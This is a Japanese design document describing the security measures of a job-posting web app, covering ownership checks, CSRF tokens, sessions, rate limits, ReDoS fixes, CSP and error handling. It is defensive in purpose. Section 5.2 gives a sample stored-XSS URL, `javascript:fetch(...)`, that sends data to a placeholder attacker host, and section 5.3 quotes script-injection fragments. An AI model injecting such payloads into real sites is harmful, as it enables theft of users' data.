# セキュリティ対策

JobLens Japanで行っているセキュリティ対策と、その理由をまとめています。
各項目は「何を防ぐか」「なければ何が起きるか」「どう実装したか」「どう確認したか」の順に書いています。

## 1. 所有者の確認

### 1.1 求人票は必ず所有者で絞り込んで取得する

- **何を防ぐか**：ほかのユーザーの求人票を見たり、編集・削除したり、メモを書いたりすること（IDOR、OWASP API Security Top 10のBOLA）。
- **なければ何が起きるか**：求人票のIDは連番のため、URLの数字を変えるだけで、ほかのユーザーの求人票を順に読めてしまう。取得の処理は編集や削除でも使うため、読めるだけでなく書き換えや削除もできてしまう。
- **どう実装したか**：求人票はIDだけで取得せず、必ずログイン中のユーザーのIDと組み合わせて取得する（`findByIdAndUserId`）。メモや変更履歴も、まず親の求人票が自分のものかを同じ条件で確かめてから扱う（`findByIdAndUserId`、`existsByIdAndUserId`）。
- **どう確認したか**：別のユーザーの求人票に対して、取得・編集・応募状況の変更・削除・分析・履歴・メモのそれぞれで404になり、データが変わらないことをテストしている。一覧・検索・件数集計に自分の求人票しか出ないことも確認している。

> 根拠：`JobPostingRepository`（`findByIdAndUserId`）、`JobPostingOwnershipTest`

### 1.2 ほかのユーザーの求人票には403ではなく404を返す

- **何を防ぐか**：ほかのユーザーの求人票が「存在すること」が知られること。
- **なければ何が起きるか**：403（権限なし）を返すと、「そのIDの求人票はあるが自分のものではない」と分かる。IDを順に試せば、どのIDに求人票があるかや、サービス全体の件数が分かってしまう。
- **どう実装したか**：存在しない求人票と、ほかのユーザーの求人票を区別せず、同じ404と同じメッセージを返す。また、所有者の確認をほかのどの確認よりも先に行う。たとえば編集では、If-Matchのバージョンの確認より先に所有者を確認する。順番が逆だと、バージョンが違うときの412から、求人票があることや、今のバージョン（何回編集されたか）が分かってしまうため。
- **どう確認したか**：存在しない求人票とほかのユーザーの求人票で、応答が同じになることをテストしている。誤ったIf-Matchで編集や応募状況の変更をしても、412ではなく404になることもテストしている。
- **選ばなかった案**：403は「権限がない」ことを正確に伝えられるが、存在を知らせてしまう。管理画面のように存在を知られても問題ないものなら403でよいが、個人の求人票は存在自体が情報になるため404にした（GitHubも、権限のない非公開リポジトリには404を返す）。

> 根拠：`JobPostingNotFoundException`、`JobPostingOwnershipTest`

### 1.3 別のタブでアカウントが切り替わったときの変更を止める

- **何を防ぐか**：前のユーザーの画面から送られた変更が、新しくログインしたユーザーのデータとして保存されること。攻撃ではなく、共有のパソコンなどで起こる事故への対策。
- **なければ何が起きるか**：セッションCookieはすべてのタブで共有される。タブ1でAさんの画面を開いたまま、タブ2でBさんがログインすると、タブ1から保存したAさんのメモや求人票は、Bさんのセッションで処理され、Bさんのアカウントに保存されてしまう。
- **どう実装したか**：
  - フロントエンドは、データを変更するリクエストに、画面が想定しているユーザーのIDを `X-Expected-User-Id` ヘッダーで付ける。サーバーはセッションのユーザーと照合し、違えば処理せずに409を返す。
  - このヘッダーは認証には使わない。認証と所有者の確認は常にセッションのユーザーで行う。ヘッダーを省略したり書き換えたりしても、自分のセッションで自分のデータを変更できるだけで、ほかのユーザーのデータには届かない。そのため、ヘッダーがないときは照合しない。
  - あわせて、ログイン・ログアウトしたタブは `localStorage` の変更でほかのタブに知らせ、知らせを受けたタブはサーバーにログイン状態を確認し直す。ただし知らせが届く前に送られたリクエストは防げないため、最後はサーバーの照合で止める。
- **どう確認したか**：ヘッダーのユーザーがセッションのユーザーと違う場合や、数値でない場合に409になり、データが変わらないことをテストしている。同じユーザーなら処理されること、取得・ログイン・会員登録は照合しないことも確認している。

> 根拠：`ExpectedUserInterceptor`（`X-Expected-User-Id`）、`ExpectedUserCheckTest`、`frontend/src/api/apiClient.ts`、`frontend/src/auth/authSync.ts`

> 根拠：`ExpectedUserInterceptor`（`X-Expected-User-Id`）、`ExpectedUserCheckTest`

## 2. CSRF対策

### 2.1 CookieとヘッダーのトークンでCSRFを防ぐ

- **何を防ぐか**：ログイン中のユーザーが別のサイトを開いたときに、そのサイトからJobLensへ、本人の意図しない変更のリクエストを送られること（CSRF）。
- **なければ何が起きるか**：ブラウザはJobLensへのリクエストにセッションCookieを自動で付けるため、サーバーからは本人の操作と区別できない。攻撃者は応答を読めなくても、メモの作成や求人票の削除などを実行させることができる。
- **どう実装したか**：
  - サーバーはランダムなトークンを `XSRF-TOKEN` Cookieで渡し、フロントエンドはその値を読んで `X-XSRF-TOKEN` ヘッダーに入れる。サーバーはCookieとヘッダーの値が一致するときだけ処理する（Spring Securityの `csrf.spa()`）。
  - 別のサイトのJavaScriptは、同一オリジンポリシーによりJobLensのCookieを読めないため、正しいヘッダーを作れない。
  - フロントエンドが値を読めるよう、このCookieはHttpOnlyにしない。トークンだけではログインできず、ほかのサイトからは読めないため問題ない。JobLensの中でXSSが起きた場合はトークンも読まれるが、そのときはCSRFの対策では防げないため、XSSはContent Security Policy（5.1）で防ぐ。ログイン情報であるセッションCookieはHttpOnlyのままにしている。
  - ログインのリクエストにもトークンを求める。ログイン前はセッションCookieがないため、SameSiteでは防げない「攻撃者のアカウントで被害者をログインさせる」攻撃（ログインCSRF）も防ぐため。
- **どう確認したか**：最初のリクエストでトークンのCookieが発行されること、トークンのない変更やログインが403になること、正しいトークンを付ければ会員登録から求人票の登録まで処理されることをテストしている。
- **選ばなかった案**：セッションCookieには `SameSite=Lax` も付けているため、多くのブラウザは別のサイトからのPOSTにCookieを付けない。ただし、SameSiteだけには頼らなかった。対応していない古いブラウザがあること、サブドメインのような「同じサイト」からのリクエストは防げないこと、上のログインCSRFは防げないことが理由。

> 根拠：`SecurityConfig`（`csrf.spa()`、`CookieCsrfTokenRepository.withHttpOnlyFalse()`）、`SessionCookieConfig`（`SameSite=Lax`）、`SecurityAccessTest`

### 2.2 ログインのときにCSRFトークンを発行し直す

- **何を防ぐか**：ログイン前に知られたトークンが、ログイン後もそのまま使われること。
- **なければ何が起きるか**：共有のパソコンなどで、ログイン前のトークンを攻撃者が知っていたり、攻撃者が自分の知っているトークンを被害者のブラウザに仕込んだりできると、被害者がログインした後もそのトークンが有効なままになる。攻撃者はトークンを知っているため、2.1の対策が効かなくなり、被害者のブラウザを通して変更のリクエストを通せてしまう。
- **どう実装したか**：ログインと会員登録に成功したら、新しいトークンを発行してCookieを置き換える。ログアウトと退会ではトークンのCookieを消す。JSONで受け取る独自のログインAPIでは、フォームログインのようにSpring Securityが自動で行わないため、自分で行っている。セッションIDを変える3.3と同じ考え方。
- **どう確認したか**：会員登録とログインのそれぞれで、ログイン前と違うトークンが発行され、ログイン前のトークンをヘッダーに入れると403になり、新しいトークンなら処理されることをテストしている。ログアウトでトークンのCookieが消え、次のリクエストで新しいトークンが発行されることもテストしている。

> 根拠：`LoginSessionManager`、`AuthController`、`SecurityAccessTest`、`AuthControllerTest`

## 3. 認証とセッション

### 3.1 JWTではなくサーバー側のセッションを使う

- **選んだ理由**：ログイン状態をサーバー側（PostgreSQL）に保存しているため、ログアウトや退会のときに、その場でログインを終わらせられる。退会では、ほかの端末でログイン中のセッションもまとめて削除している。
- **どう実装したか**：Spring Session JDBCでセッションをPostgreSQLに保存し、ブラウザにはセッションIDだけをCookieで渡す。操作がないまま30分たつとセッションは切れる。
- **どう確認したか**：ログアウトした後は同じセッションで使えないこと、退会するとほかの端末のセッションも使えなくなることをテストしている。
- **選ばなかった案**：JWTはサーバーに状態を持たないため、サーバーを増やしやすい。しかし、発行済みのトークンは有効期限まで使えてしまい、サーバーから取り消せない。取り消すには無効にしたトークンの一覧をサーバーに持つ必要があり、状態を持たない利点がなくなる。JobLensはサーバー1台とデータベースの構成で、即座にログインを終わらせられることのほうが大事なため、セッションを選んだ。

> 根拠：`SecurityConfig`、Spring Session JDBC（`V10__create_users_and_sessions.sql`）、`application.yaml`（`server.servlet.session.timeout: 30m`）、`AuthControllerTest`、`AccountDeletionIntegrationTest`

### 3.2 セッションCookieの属性

- **HttpOnly**：JavaScriptからCookieを読めなくする。XSSが起きても、スクリプトがセッションIDを読んで外部に送ることはできない。
- **SameSite=Lax**：別のサイトからのPOSTなどにはCookieを付けない。CSRFに対する追加の防御（2.1）。
- **Secure（既定でtrue）**：HTTPSのときだけCookieを送る。公共のWi-Fiなどで、HTTPの通信からセッションIDを盗み見られるのを防ぐ。
  - 既定をtrueにし、HTTPで動かすローカル環境でだけ `SESSION_COOKIE_SECURE=false` を指定する。逆に「既定はfalseで、本番でだけtrueにする」と、本番で設定を忘れても何のエラーも出ず、気付かないまま危ない状態で公開してしまう。設定を忘れたときに安全なほうに倒れるようにした。
  - HTTPSかどうかの自動判定に任せないのは、プロキシの後ろでは常にHTTPと判断され、Secureが付かない場合があるため。
- **どう確認したか**：ログインで発行されるセッションCookieに、HttpOnly・SameSite=Lax・Secureが付くことをテストしている。`SESSION_COOKIE_SECURE=false` のときだけSecureが外れ、HttpOnlyは残ることもテストしている。

> 根拠：`SessionCookieConfig`、`AuthControllerTest`、`SessionCookieSecureDisabledTest`

### 3.3 セッション固定攻撃の対策

- **何を防ぐか**：ログイン前のセッションIDを攻撃者が知っていたり、被害者のブラウザに仕込んだりしておき、被害者がログインした後にそのセッションIDで本人になりすますこと（セッション固定攻撃）。
- **なければ何が起きるか**：ログインしてもセッションIDが変わらないと、攻撃者は自分のブラウザでそのセッションIDを使うだけで、被害者としてログインした状態になる。2.2のCSRFトークンは被害者のブラウザを通さないと使えないが、セッションIDはログインそのものなので、アカウントを直接乗っ取られる。
- **どう実装したか**：ログインと会員登録に成功したら、セッションIDを変える（`changeSessionId`）。JSONで受け取る独自のログインAPIでは、Spring Securityが自動で行わないため、自分で行っている。
- **どう確認したか**：ログインするとセッションIDが変わり、ログイン前のセッションIDでは使えないことをテストしている。

> 根拠：`LoginSessionManager`（`changeSessionId`）、`AuthControllerTest`

### 3.4 パスワードの保存と退会

- **パスワード**：
  - 平文ではなくbcryptのハッシュで保存する。データベースが漏れても、元のパスワードはすぐには分からない。
  - SHA-256のような速いハッシュは、GPUで1秒に何十億回も試せるため、漏れたハッシュから総当たりでパスワードを見つけやすい。bcryptは1回の計算をわざと遅くしているため、総当たりに時間がかかる。ユーザーごとにランダムなソルトも入るため、同じパスワードでも違うハッシュになり、事前に計算した表も使えない。
  - `{bcrypt}` のような接頭辞を付けて保存しているため、将来アルゴリズムを変えても、今のハッシュをそのまま検証できる。
- **退会**：
  - 退会の前に、パスワードをもう一度確認する。ログインしたまま離れた共有のパソコンなどで、ほかの人に退会させられないようにするため。パスワードの総当たりに使われないよう、退会のリクエスト数も制限している（4.1）。
  - 退会すると、求人票・メモ・変更履歴と、ほかの端末を含むすべてのセッションを削除する。
- **どう確認したか**：パスワードがハッシュで保存されること、正しいパスワードで退会すると本人のデータとすべてのセッションが消え、ほかのユーザーのデータは残ることをテストしている。

> 根拠：`SecurityConfig`（`createDelegatingPasswordEncoder`）、`AuthService.deleteAccount`、`AuthControllerTest`、`AccountDeletionTest`、`AccountDeletionIntegrationTest`

## 4. 使いすぎ・悪用の防止

### 4.1 リクエスト数の制限（レート制限）

- **何を防ぐか**：
  - ログイン：パスワードの総当たり、よく使われるパスワードを多くのアカウントで試す攻撃（パスワードスプレー）、ほかのサイトから漏れたメールアドレスとパスワードの組を試す攻撃（クレデンシャルスタッフィング）。
  - 退会：退会のときのパスワード確認を、総当たりに使われること。
  - 会員登録と書き込みAPI：アカウントやデータを短時間に大量に作られ、保存量を使い切られること。
- **どう実装したか**：
  - Nginxで、接続元のIPアドレスごとにリクエスト数を制限する（ログイン5回/分、会員登録1回/分、退会5回/分、書き込み30回/分）。制限を超えた分はバックエンドに送らず、APIと同じ形式のJSONの429と `Retry-After` を返す。
  - IPアドレスには、`X-Forwarded-For` ヘッダーではなく、TCP接続の相手のアドレスを使う。ヘッダーはクライアントが自由に書けるため、リクエストごとに違う値を入れられると、毎回別のIPアドレスとして数えられ、制限が効かなくなる。TCP接続の相手のアドレスは、通信を成り立たせるために本物である必要があり、偽れない。
- **どう確認したか**：Docker Composeで実際にNginxを起動し、ログイン・会員登録・退会・書き込みのそれぞれが決めた回数で429になり、JSONと `Retry-After` が返ることをCIで確認している。

> 根拠：`frontend/nginx.conf`、`check_docker_smoke.py`（`check_auth_rate_limits`、`check_account_delete_rate_limit`、`check_write_rate_limit`）

> 根拠：`frontend/nginx.conf`（ログイン5回/分、会員登録1回/分、退会5回/分、書き込み30回/分。いずれもIPアドレスごと）、`check_docker_smoke.py`（`check_auth_rate_limits`、`check_account_delete_rate_limit`、`check_write_rate_limit`）

### 4.2 リクエストサイズと保存量の上限

- **何を防ぐか**：巨大なリクエストや大量のデータで、サーバーのメモリ・CPU・ディスクを使い切られること（DoS）。
- **なければ何が起きるか**：
  - 原文はバックエンドでも2万文字までに制限している。しかしバックエンドは、文字数を確かめる前にリクエストの本文をすべて読み込む。100MBの本文を送られると、拒否する前にその分のメモリとCPUを使ってしまい、何度も送られるとメモリ不足で止まるおそれがある。
  - 保存量に上限がないと、1人のユーザーがディスクを使い切り、ほかの利用者も使えなくなる。
- **どう実装したか**：
  - Nginxで本文を1MBまでに制限し、超えたリクエストはバックエンドに送らずに413を返す。正常なリクエストで一番大きいもの（原文2万文字）はJSONで約120KBのため、十分に余裕がある。
  - 保存量の上限：求人票はユーザーごとに100件、メモは求人票ごとに50件、ユーザーは全体で100人。応募状況の変更履歴は求人票ごとに100件までで、超えたら古いものから削除する。一覧は1回に20件までしか返さない。
  - 上限に達しても止めるのは新しい登録だけで、編集・応募状況の変更・削除はできる。全部止めてしまうと、利用者は古いデータを整理できず、上限から抜け出せなくなるため。
  - 同時に2件登録されても上限を超えないよう、登録の前にユーザーの行をロックし（`SELECT ... FOR UPDATE`）、同じユーザーの登録を1件ずつ処理する。ロックしないと、99件の状態で同時に来た2件が、どちらも「まだ99件」と判断して、101件になってしまう。PostgreSQLの既定のトランザクション分離レベル（READ COMMITTED）では、これは防げない。
  - 全体のユーザー数の上限は、保存量を抑えるための目安のため、同時登録で数人超えることは許容し、ロックは取らない。上限に達して断るときは、時間のかかるパスワードのハッシュを計算しない。
- **どう確認したか**：
  - 1MBを超える本文が413になることを、Docker Composeで確認している。
  - 求人票とメモが上限で409になって保存されないこと、上限でも編集・削除ができ、削除すれば再び登録できること、同時に登録しても上限を超えないことをテストしている。変更履歴は、上限を超えたら一番古いものだけが消えることを確認している。
  - ユーザー数が上限のときは会員登録を断り、ログインはできることをテストしている。

> 根拠：`nginx.conf`（`client_max_body_size 1m`）、`application.yaml`（`joblens.limits`、`max-page-size: 20`）、`JobPostingService.create`、`UserRepository.findLockedById`、`check_body_size_limit`、`UsageLimitTest`、`SignupLimitTest`

### 4.3 分析の正規表現で時間がかかる入力（ReDoS）

- **何を防ぐか**：特定の入力で正規表現の処理に長い時間がかかり、サーバーのCPUを使い続けられること（ReDoS）。
- **なければ何が起きるか**：
  - 分析は、利用者が自由に書ける最大2万文字の原文に、正規表現を使う。しかも詳細画面だけでなく一覧でも、1回に最大20件の求人票を毎回分析する。照会にはリクエスト数の制限がないため、危ない原文を保存して一覧を開き続けるだけで、ほかの利用者の処理まで遅くできてしまう。Javaの正規表現には時間制限もない。
  - 実際に測ったところ、末尾の記号を除く2つの正規表現（`\s*:$` と `[...]+$`）が問題だった。行の途中に空白や記号が長く続くと、その1文字ごとに末尾まで読み直すため、時間が文字数の2乗で増える。2万文字の1行で、1件の分析に4〜5秒、一覧でも1件あたり約0.9秒かかっていた。
- **どう実装したか**：
  - 2つの正規表現をやめ、文字列の前と後ろから1回ずつ読んで除く処理にした。同じ入力で約15msになった。
  - 結果が変わらないよう、空白は正規表現の `\s` と同じASCIIの空白だけにした。
  - ほかの正規表現も確かめた。`(a+)+` のような繰り返しの入れ子はなく、技術名や「固定残業」の後ろに空白・数字・ドットが2万文字続く入力などで測っても、十数msで終わったため、残している。
- **どう確認したか**：
  - 空白・タブ・コロン・括弧などが2万文字続く1行で、分析が500ms以内に終わることをテストしている（普通の求人票の分析は数十ms。遅い環境でも揺れないよう余裕を持たせた）。
  - 以前の正規表現をテストの中に残し、記号・空白・文字を混ぜた2万通りの文字列で、新しい処理と結果が同じになることを確かめている。
  - 新しい処理を以前の正規表現に戻したり、空白の種類や記号の集合を変えたりすると、これらのテストが失敗することを確かめた（変異テスト）。

> 根拠：`PostingSectionSplitter.removeTrailingColon`、`SkillAnalyzer.removeLabelDecoration`、`AnalysisWorstCaseInputTest`

## 5. ブラウザ側の対策

### 5.1 Content Security Policyとセキュリティヘッダー

- **何を防ぐか**：XSSが起きたときの被害（スクリプトの実行や、データを外部へ送ること）と、ほかのサイトにJobLensの画面を埋め込まれること（クリックジャッキング）。
- **なければ何が起きるか**：
  - 画面の表示はReactがエスケープするが（5.3）、開発者のミスやライブラリの不具合で、スクリプトを差し込まれることはあり得る。そのとき制限がなければ、差し込まれたスクリプトがそのまま動き、データを攻撃者のサーバーへ送れてしまう。
  - ほかのサイトがJobLensの画面を透明なiframeで重ね、自分のボタンの位置にJobLensのボタンを置くと、利用者は気付かないままJobLensのボタンを押してしまう。
- **どう実装したか**：Nginxが返す画面の応答に、次のヘッダーを付ける。
  - `Content-Security-Policy`：スクリプト・スタイル・画像・通信先を、同じオリジンだけに限る。`'unsafe-inline'` を許可しないため、HTMLに差し込まれた `<script>` や `onerror="..."` のような属性のスクリプトは実行されない。`connect-src 'self'` により、スクリプトが動いても外部のサーバーへは送れない。ビルド結果にインラインのスクリプトとスタイルはないため、この制限で画面は壊れない。
  - `frame-ancestors 'none'` と `X-Frame-Options: DENY`：どのサイトのiframeにも表示させない。後者は `frame-ancestors` に対応していない古いブラウザ向け。
  - `X-Content-Type-Options: nosniff`：ブラウザにファイルの中身から種類を推測させず、画像などのつもりのファイルをスクリプトとして実行させない。
  - `Referrer-Policy: same-origin`：外部のサイトへ移るときに、JobLensのURL（求人票のIDや検索条件を含む）を送らない。
  - APIの応答には、Spring Securityが同じ種類のヘッダーを付けるため、Nginxでは重ねて付けない。
- **どう確認したか**：Docker Composeで実際にNginxを起動し、画面の各経路（404も含む）にヘッダーが付くこと、APIの応答にはSpring Securityのヘッダーが重複せず1つずつ付くことをCIで確認している。

> 根拠：`frontend/security-headers.conf`、`frontend/nginx.conf`、`check_security_headers`

### 5.2 求人票の元URLはhttpとhttpsだけを受け付ける

- **何を防ぐか**：求人票の元URLに `javascript:` のURLを保存され、それを開いたときにスクリプトが実行されること。
- **なければ何が起きるか**：元URLに `javascript:fetch('https://evil.example/?c=' + ...)` を保存されると、詳細画面の「原文を見る」を押したときに、そのコードがJobLensの画面の中で実行される。保存した内容が後で実行されるため、蓄積型のXSSになる。
- **どう実装したか**：
  - サーバーで、`http://` か `https://` で始まり、その後にホストが続くURLだけを受け付ける。危ないスキームを1つずつ禁止するのではなく、安全なスキームだけを許可しているため、`javascript:` も `data:` も、知らないスキームも通らない。
  - ブラウザはURLの中のタブや改行を取り除いてから解釈するため、空白と制御文字を含む値も拒否し、サーバーの判定とブラウザの動作がずれないようにしている。
  - 正規表現は使わない。入力は本文の上限（1MB）まで長くなり得るため、先頭の文字列の比較だけで判定する。
  - CSP（5.1）も `javascript:` のURLの実行を止めるため、二重に防いでいる。
- **どう確認したか**：httpとhttpsのURLは許可し、それ以外のスキーム、ホストのない値、空白や制御文字を含む値を拒否すること、とても長い値もすぐに判定できることをテストしている。

> 根拠：`ValidHttpUrl`、`HttpUrlValidator`、`HttpUrlValidatorTest`

### 5.3 画面への表示と外部リンク

- **表示**：
  - 求人票の原文やメモは、Reactの `{text}` で表示する。Reactは `<` や `>` を文字としてエスケープするため、原文に `<script>` や `<img onerror="...">` が書かれていても、ただの文字として表示され、実行されない。
  - HTMLとして差し込む `dangerouslySetInnerHTML` は使っていない。これを使うと、`<img src=x onerror="...">` のような属性のスクリプトが実行されてしまう。
  - 入力中の下書きは、ほかのタブと共有しない `sessionStorage` に、ユーザーごとのキーで保存する。タブを閉じれば消え、ログアウトやユーザーの切り替えでも消す。共有のパソコンで、次の利用者に残さないため。
- **外部リンク**：求人サイトへのリンクは新しいタブで開き、`rel="noreferrer"` を付ける。開いた先のページに、JobLensのURLを送らないためと、`window.opener` を使って元のタブを別のページに書き換えられないようにするため（`noreferrer` は `noopener` の働きも含む）。

> 根拠：`dangerouslySetInnerHTML` を使っていない、`rel="noreferrer"`（`JobPostingListItem`、`JobPostingDetailPage`）、`frontend/src/utils/draftStorage.ts`

## 6. エラー応答と公開範囲

- **何を防ぐか**：エラー応答やサーバーの情報から、攻撃の手がかりを与えること。
- **エラー応答**：
  - 404・405・415・500を含むすべてのエラーを、同じ形式のJSONで返す。画面は `code` で処理を分けられ、HTMLのエラーページが返って画面が壊れることもない。
  - 500の応答には、決まった文言だけを入れる。例外のメッセージやスタックトレースをそのまま返すと、テーブル名や列名（たとえば `uq_users_email` という制約名から、`users` テーブルの `email` に一意制約があること）、使っているデータベースやフレームワーク、クラス名が分かり、狙いを絞った攻撃の手がかりになる。詳しい内容はサーバーのログにだけ残す。
  - データベースのエラーはSQLStateで分け、利用者が直せる値の問題は400、ほかのデータとの競合は409、それ以外はサーバーの問題として500にする。
  - ログインに失敗したときは、メールアドレスが登録されていない場合とパスワードが違う場合を区別せず、同じ401と同じメッセージを返す。区別すると、どのメールアドレスが登録されているかが分かり、そのアカウントだけを狙ったパスワードの試行ができてしまうため（1.2と同じ考え方）。会員登録で「登録済み」と伝えている点は7.1に書く。
- **ログ**：利用者の入力が原因の400・409は、メソッド・パス・SQLStateだけを警告として短く残し、500だけをスタックトレース付きのエラーとして残す。不正な入力を繰り返し送られたときに、ログがあふれてディスクを使い切ったり、本当に直すべきエラーが埋もれたりしないようにするため。
- **公開しないもの**：
  - Nginxのバージョンを、応答のヘッダーとエラーページに出さない（`server_tokens off`）。バージョンが分かると、そのバージョンの既知の脆弱性を狙われるため。
  - 管理用のActuatorは、Nginxで外部には404を返す。ヘルスチェックは、Docker Composeの中からだけ使う。
  - バックエンドのポートはホストに公開せず、Nginxを通してだけアクセスできる。データベースのポートは `127.0.0.1` にだけ公開し、ほかの端末からは接続できない。
- **どう確認したか**：存在しないパス・対応していないメソッドやContent-Type・処理されない例外が同じ形式で返り、500に内部の情報が含まれないこと、CHECK制約の違反で制約名が応答に出ないこと、400・409ではエラーログを残さないことをテストしている。Docker Composeでも、Spring Bootのエラーが同じ形式で返ることを確認している。

> 根拠：`GlobalExceptionHandler`、`ApiErrorAttributes`、`DatabaseErrors`、`ErrorResponseIntegrationTest`、`check_spring_error_format`、`nginx.conf`（`server_tokens off`、`/actuator` は404）、`docker-compose.yml`

## 7. 分かっている限界と、公開時に行うこと

すべてを防いでいるわけではありません。分かっていて残している点と、まだ確かめていない点を書いておきます。

### 7.1 選んで残している限界

- **会員登録で、登録済みのメールアドレスが分かる**：登録済みのメールアドレスで会員登録すると「登録済み」と返すため、メールアドレスが登録されているかどうかが分かる（ログインでは区別しない。6章）。何も伝えないと、利用者はなぜ登録できないのか分からない。よく使われる対策は「確認メールを送りました」とだけ返して結果をメールで知らせる方法だが、JobLensにはメールを送る機能がない。代わりに会員登録を1分に1回に制限し、大量に調べにくくしている。
- **メールアドレスの確認がない**：会員登録のときにメールアドレスの持ち主かどうかを確かめないため、ほかの人のメールアドレスで先に登録できてしまう。その場合、本当の持ち主はそのメールアドレスで登録できなくなる。ただし、そのアカウントに入るのは登録した人自身のデータで、持ち主のデータが見られるわけではない。パスワードの再設定もメールを使うため、提供していない。
- **レート制限はIPアドレスごとで、アカウントごとのロックはない**：多くのIPアドレスに分けて試す攻撃（ボットネットなど）は、IPアドレスごとの回数が少なくなるため止められない。逆に、会社などで同じIPアドレスを使う人どうしは、回数を分け合うことになる。
- **全体のユーザー数の上限（100人）は埋められ得る**：偽のアカウントで上限を埋められると、本当の利用者が登録できなくなる。それでも上限を残しているのは、上限がないとディスクを使い切られ、今の利用者も含めてサービス全体が止まるため。上限に達しても、止まるのは新しい登録だけで、今の利用者はそのまま使える。上限に達したら警告をログに残し、手作業で整理する手順を用意している（`scripts/ops/README.md`）。
- **パスワードの条件は8〜64文字だけ**：漏れたことのあるパスワードかどうかは確かめていない。
- **ログイン失敗の記録や監査ログがない**：攻撃を受けていることに気付く仕組みは、監視の仕組みと一緒に考える。
- **照会（GET）にはリクエスト数の制限がない**：書き込みだけを制限しているため、一覧や分析を繰り返し開くことはできる。1回の処理を短く保つことで負荷を抑えている（4.3）。

### 7.2 まだ確認していないこと

- **依存ライブラリの脆弱性**：DependabotとCodeQLで日常的に確認しているが、公開の直前に、TomcatやSpringなどの主要なライブラリのセキュリティ情報をもう一度確認する。

### 7.3 公開時に行うこと

- **HTTPSとHSTS**：すべての通信をHTTPSにし、HSTSでブラウザにHTTPを使わせない。
- **ロードバランサーの後ろでの本当のIPアドレス**：ロードバランサーの後ろに置くと、Nginxから見える接続元はすべてロードバランサーのIPアドレス1つになる。このままだと、すべての利用者が「書き込み30回/分」や「ログイン5回/分」を分け合い、普通に使うだけで429になり、1人がログインを繰り返すだけでほかの全員がログインできなくなる。信頼できるロードバランサーが付けた値だけから本当のIPアドレスを取る設定（`set_real_ip_from`）が、公開の前提になる。
- **プロキシヘッダーとCookie**：TLSをロードバランサーで終える場合、NginxやSpringがHTTPSのリクエストだと分かるように `X-Forwarded-Proto` を正しく引き継ぎ、CSRFトークンのCookieにもSecureが付くようにする。HTTPのローカル用のDocker Compose（`SESSION_COOKIE_SECURE=false`）は、本番でそのまま使わない。
- **データベース**：既定のパスワードを使わず、アプリには管理者ではない専用のユーザーを使う。
- **公開範囲**：バックエンド・データベース・Actuatorが、外部から直接見えないことを確かめる。
- **運用**：ユーザー数の上限に達したことを知らせる仕組みと、退会した人のデータがバックアップにどれだけ残るか（保存期間）を決める。
